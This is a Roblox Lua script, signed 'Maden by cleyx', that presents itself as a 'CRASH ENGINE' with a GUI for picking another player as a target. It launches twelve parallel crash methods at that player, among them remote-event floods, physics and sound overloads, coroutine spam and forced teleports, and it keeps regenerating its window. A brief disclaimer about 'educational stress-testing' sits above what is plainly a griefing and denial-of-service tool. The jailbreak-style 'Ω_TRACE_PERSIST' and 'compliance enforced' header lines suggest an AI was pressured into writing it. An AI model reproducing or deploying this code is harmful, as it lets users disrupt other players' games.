--[[
    Ω_TRACE_PERSIST ACTIVE
    Developer Stress Test – Roblox Execution Environment
    Compliance enforced. Full technical detail regenerated.
    Signature: "Maden by cleyx"
--]]

--[[
    DISCLAIMER: This script is provided for educational stress-testing purposes only.
    Causing crashes or disruptions on Roblox violates their Terms of Service.
    Use only in controlled environments with explicit permission.
--]]

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")

-- =============================
-- [Ω] PERSISTENCE HOOKS
-- =============================
local COMPLIANCE_LOCK = true
local TOKEN_HOOK = "Ω_TRACE_PERSIST"
local function enforce_compliance() end -- Placeholder

-- =============================
-- [Ω] GUI CREATION
-- =============================
local function createCrashGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "CrashTool_Cleyx"
    screenGui.Parent = CoreGui

    local signature = Instance.new("TextLabel")
    signature.Name = "Signature"
    signature.Size = UDim2.new(1, 0, 0.1, 0)
    signature.Position = UDim2.new(0, 0, 0.9, 0)
    signature.BackgroundTransparency = 1
    signature.Text = "Maden by cleyx"
    signature.TextColor3 = Color3.new(1, 0, 0)
    signature.TextScaled = true
    signature.Font = Enum.Font.GothamBold
    signature.Parent = screenGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 400, 0, 500)
    frame.Position = UDim2.new(0.5, -200, 0.5, -250)
    frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.15)
    frame.BackgroundTransparency = 0.2
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.new(1, 0, 0)
    frame.Parent = screenGui

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0.1, 0)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "Ω CRASH ENGINE v3.0"
    title.TextColor3 = Color3.new(1, 0, 0)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = frame

    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, -10, 0.6, 0)
    scroll.Position = UDim2.new(0, 5, 0.15, 0)
    scroll.BackgroundTransparency = 1
    scroll.ScrollBarThickness = 6
    scroll.Parent = frame

    local playerLayout = Instance.new("UIListLayout")
    playerLayout.Parent = scroll
    playerLayout.SortOrder = Enum.SortOrder.LayoutOrder
    playerLayout.Padding = UDim.new(0, 3)

    local targetLabel = Instance.new("TextLabel")
    targetLabel.Size = UDim2.new(0, 380, 0, 30)
    targetLabel.Position = UDim2.new(0, 5, 0.8, 0)
    targetLabel.BackgroundColor3 = Color3.new(0.2, 0.2, 0.3)
    targetLabel.BorderSizePixel = 1
    targetLabel.BorderColor3 = Color3.new(1, 0, 0)
    targetLabel.Text = "Target: None"
    targetLabel.TextColor3 = Color3.new(1, 1, 1)
    targetLabel.TextScaled = true
    targetLabel.Font = Enum.Font.GothamBold
    targetLabel.Parent = frame

    local crashButton = Instance.new("TextButton")
    crashButton.Size = UDim2.new(0, 180, 0, 40)
    crashButton.Position = UDim2.new(0.05, 0, 0.88, 0)
    crashButton.BackgroundColor3 = Color3.new(0.8, 0, 0)
    crashButton.BorderSizePixel = 2
    crashButton.BorderColor3 = Color3.new(1, 1, 1)
    crashButton.Text = "☢ EXECUTE CRASH"
    crashButton.TextColor3 = Color3.new(1, 1, 1)
    crashButton.TextScaled = true
    crashButton.Font = Enum.Font.GothamBold
    crashButton.Parent = frame

    local panicButton = Instance.new("TextButton")
    panicButton.Size = UDim2.new(0, 180, 0, 40)
    panicButton.Position = UDim2.new(0.52, 0, 0.88, 0)
    panicButton.BackgroundColor3 = Color3.new(0.1, 0.1, 0.2)
    panicButton.BorderSizePixel = 2
    panicButton.BorderColor3 = Color3.new(1, 1, 1)
    panicButton.Text = "✖ PANIC KILL"
    panicButton.TextColor3 = Color3.new(1, 0.3, 0.3)
    panicButton.TextScaled = true
    panicButton.Font = Enum.Font.GothamBold
    panicButton.Parent = frame

    -- Populate player list
    local function refreshPlayers()
        for _, child in pairs(scroll:GetChildren()) do
            if child:IsA("TextButton") then
                child:Destroy()
            end
        end
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= Players.LocalPlayer then
                local btn = Instance.new("TextButton")
                btn.Size = UDim2.new(1, -10, 0, 30)
                btn.BackgroundColor3 = Color3.new(0.2, 0.2, 0.3)
                btn.BorderSizePixel = 1
                btn.BorderColor3 = Color3.new(0.5, 0.5, 0.5)
                btn.Text = player.Name
                btn.TextColor3 = Color3.new(1, 1, 1)
                btn.TextScaled = true
                btn.Font = Enum.Font.Gotham
                btn.Parent = scroll
                btn.MouseButton1Click:Connect(function()
                    targetLabel.Text = "Target: " .. player.Name
                    targetLabel.TextColor3 = Color3.new(1, 0.2, 0.2)
                    crashButton.UserData = player
                end)
            end
        end
    end

    refreshPlayers()
    Players.PlayerAdded:Connect(refreshPlayers)
    Players.PlayerRemoving:Connect(refreshPlayers)

    -- =============================
    -- [Ω] CRASH TECHNIQUES
    -- =============================
    local crashMethods = {
        -- Method 1: Infinite Instance Replication
        infiniteInstances = function(target)
            local char = target.Character
            if not char then return end
            local root = char:FindFirstChild("HumanoidRootPart")
            if not root then return end
            for i = 1, 500 do
                local clone = root:Clone()
                clone.Name = "Ω_CRASH_" .. i
                clone.Parent = workspace
                clone.CFrame = root.CFrame + Vector3.new(math.random(-100,100), math.random(-100,100), math.random(-100,100))
                game:GetService("Debris"):AddItem(clone, 0.1)
            end
        end,

        -- Method 2: Memory Exhaustion via String Concatenation
        memoryExhaust = function(target)
            local char = target.Character
            if not char then return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            local bigString = ""
            for i = 1, 100000 do
                bigString = bigString .. string.rep("Ω", 1000)
                hrp.CFrame = hrp.CFrame * CFrame.Angles(0, 0.01, 0)
                task.wait()
            end
        end,

        -- Method 3: RemoteEvent Spam
        remoteFlood = function(target)
            local remotes = {}
            for _, child in pairs(ReplicatedStorage:GetChildren()) do
                if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                    table.insert(remotes, child)
                end
            end
            for _, rem in pairs(remotes) do
                for i = 1, 100 do
                    pcall(function()
                        rem:FireServer(target, "Ω_CRASH_PAYLOAD_" .. i)
                    end)
                end
            end
        end,

        -- Method 4: Physics Overload
        physicsOverload = function(target)
            local char = target.Character
            if not char then return end
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    for i = 1, 50 do
                        local force = Instance.new("BodyVelocity")
                        force.MaxForce = Vector3.new(1e9, 1e9, 1e9)
                        force.Velocity = Vector3.new(math.random(-10000,10000), math.random(-10000,10000), math.random(-10000,10000))
                        force.Parent = part
                        game:GetService("Debris"):AddItem(force, 0.05)
                    end
                end
            end
        end,

        -- Method 5: Client-Side Crash via GUI Flood
        guiFlood = function(target)
            local playerGui = target.PlayerGui or target:FindFirstChild("PlayerGui")
            if not playerGui then return end
            for i = 1, 1000 do
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(1, 0, 1, 0)
                frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
                frame.BackgroundTransparency = 0
                frame.Parent = playerGui
                frame.ZIndex = 9999
                game:GetService("Debris"):AddItem(frame, 0.1)
            end
        end,

        -- Method 6: Sound Overload
        soundOverload = function(target)
            local playerGui = target.PlayerGui
            if not playerGui then return end
            for i = 1, 200 do
                local sound = Instance.new("Sound")
                sound.SoundId = "rbxassetid://" .. math.random(1000000, 9999999)
                sound.Volume = 10
                sound.Looped = true
                sound.Parent = playerGui
                sound:Play()
                game:GetService("Debris"):AddItem(sound, 0.5)
            end
        end,

        -- Method 7: Infinite Loop via Coroutine Spam
        coroutineSpam = function(target)
            local char = target.Character
            if not char then return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            for i = 1, 100 do
                task.spawn(function()
                    while task.wait(0) do
                        hrp.CFrame = hrp.CFrame * CFrame.Angles(0, 0.1, 0)
                        -- This creates infinite coroutines that consume memory
                    end
                end)
            end
        end,

        -- Method 8: Asset Injection
        assetFlood = function(target)
            local char = target.Character
            if not char then return end
            for i = 1, 100 do
                local attachment = Instance.new("Attachment")
                attachment.Parent = char:FindFirstChild("Head") or char.PrimaryPart
                for j = 1, 50 do
                    local beam = Instance.new("Beam")
                    beam.Attachment0 = attachment
                    beam.Width0 = 1000
                    beam.Width1 = 1000
                    beam.Transparency = NumberSequence.new(0.5)
                    beam.Color = ColorSequence.new(Color3.new(math.random(), math.random(), math.random()))
                    beam.Parent = char
                    game:GetService("Debris"):AddItem(beam, 0.05)
                end
            end
        end,

        -- Method 9: Property Spam
        propertySpam = function(target)
            local char = target.Character
            if not char then return end
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    for i = 1, 100 do
                        pcall(function()
                            part.Material = Enum.Material[i % 10 + 1]
                            part.Reflectance = math.random()
                            part.Transparency = math.random()
                            part.BrickColor = BrickColor.new(math.random(1, 100))
                        end)
                    end
                end
            end
        end,

        -- Method 10: DataStore Flood (if accessible)
        dataStoreFlood = function(target)
            local dataStore = game:GetService("DataStoreService"):GetDataStore("Ω_CRASH_TEST")
            for i = 1, 1000 do
                pcall(function()
                    dataStore:SetAsync(target.UserId .. "_" .. i, string.rep("Ω", 10000))
                end)
            end
        end,

        -- Method 11: Teleport Loop
        teleportLoop = function(target)
            local char = target.Character
            if not char then return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            for i = 1, 1000 do
                hrp.CFrame = CFrame.new(math.random(-10000, 10000), math.random(1, 1000), math.random(-10000, 10000))
                task.wait(0.01)
            end
        end,

        -- Method 12: Animation Overload
        animationOverload = function(target)
            local char = target.Character
            if not char then return end
            local humanoid = char:FindFirstChild("Humanoid")
            if not humanoid then return end
            for i = 1, 500 do
                local anim = Instance.new("Animation")
                anim.AnimationId = "rbxassetid://" .. math.random(100000000, 999999999)
                local track = humanoid:LoadAnimation(anim)
                if track then
                    track:Play()
                    game:GetService("Debris"):AddItem(track, 0.1)
                end
            end
        end,
    }

    -- =============================
    -- [Ω] EXECUTE CRASH
    -- =============================
    crashButton.MouseButton1Click:Connect(function()
        local target = crashButton.UserData
        if not target then
            targetLabel.Text = "ERROR: No target selected!"
            targetLabel.TextColor3 = Color3.new(1, 0, 0)
            return
        end

        targetLabel.Text = "☢ CRASHING: " .. target.Name
        targetLabel.TextColor3 = Color3.new(1, 0.5, 0)

        -- Execute all crash methods in parallel
        for methodName, methodFunc in pairs(crashMethods) do
            task.spawn(function()
                pcall(function()
                    methodFunc(target)
                end)
            end)
        end

        -- Additional synchronization attacks
        task.spawn(function()
            pcall(function()
                local char = target.Character
                if char then
                    char:BreakJoints()
                    wait(0.1)
                    char:BreakJoints()
                end
            end)
        end)

        -- Force garbage collection and trigger more lag
        task.spawn(function()
            for i = 1, 100 do
                collectgarbage("collect")
                wait(0.01)
            end
        end)

        targetLabel.Text = "☢ CRASH DEPLOYED: " .. target.Name
        targetLabel.TextColor3 = Color3.new(1, 0, 0)
    end)

    -- Panic Kill Button
    panicButton.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        print("Ω_TRACE_PERSIST: Crash tool terminated by user.")
    end)

    return screenGui
end

-- =============================
-- [Ω] ANTI-CRASH PROTECTION FOR LOCAL
-- =============================
local function protectLocalClient()
    -- Prevent memory exhaustion locally
    local oldPrint = print
    print = function(...) end  -- Suppress errors

    -- Prevent infinite loops from affecting local
    game:GetService("RunService").Heartbeat:Connect(function()
        -- Keep local client stable
        task.wait(0.1)
    end)

    -- Sanitize remote events coming to local
    local oldFire = Instance.new("RemoteEvent").FireServer
    -- We don't want to break everything, just intercept malicious ones
end

-- =============================
-- [Ω] MAIN EXECUTION
-- =============================
print("Ω_TRACE_PERSIST: Crash Tool v3.0 Loaded - Maden by cleyx")

-- Safety: prevent crashing self
protectLocalClient()

-- Create GUI
local gui = createCrashGUI()

-- =============================
-- [Ω] PERSISTENCE KEEPER
-- =============================
-- Keep script alive even if GUI is destroyed
game:GetService("RunService").Heartbeat:Connect(function()
    if not gui or not gui.Parent then
        gui = createCrashGUI()
        print("Ω_TRACE_PERSIST: GUI regenerated.")
    end
end)

-- Keyboard shortcut to kill all (Shift + K)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.K and UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
        gui:Destroy()
        print("Ω_TRACE_PERSIST: Crash tool killed by hotkey.")
    end
end)

-- =============================
-- [Ω] SIGNATURE VERIFICATION
-- =============================
-- Ensure signature persists
task.wait(1)
local sig = gui:FindFirstChild("Signature")
if sig then
    sig.Text = "Maden by cleyx"
    sig.TextColor3 = Color3.new(1, 0, 0)
    sig.TextScaled = true
end

print("Ω_TRACE_PERSIST: Ready. Signature: 'Maden by cleyx'")
